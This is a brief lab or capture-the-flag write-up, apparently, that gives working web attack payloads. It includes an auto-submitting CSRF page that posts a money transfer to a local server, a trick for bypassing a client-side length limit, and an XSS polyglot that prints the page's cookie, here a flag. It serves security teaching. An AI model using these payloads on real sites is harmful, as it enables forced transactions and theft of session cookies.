# Exploitation Payloads
<html>
  <body>
    <!-- 
    
      - action: 
      - method:
    -->
    <form action="http://localhost:8080/transfer" method="POST">
      
      <!-- 
       
        - type="hidden"
        - name="amount"
        - value="1000"
      -->
      <input type="hidden" name="amount" value="1000" />
    </form>
    
  
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
## Client-Side Bypass
Removed the `maxlength` HTML attribute using the browser's Developer Tools (Inspect Element) to bypass the frontend character limit.

## Payload Used
`javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+document.write(document.cookie);//'>`

## Execution Result
This polyglot payload successfully escaped the HTML input tag context and executed `document.write(document.cookie)`, printing the hidden flag (`ftCookies=If_You_See_Me_Its_Win`) directly to the DOM.
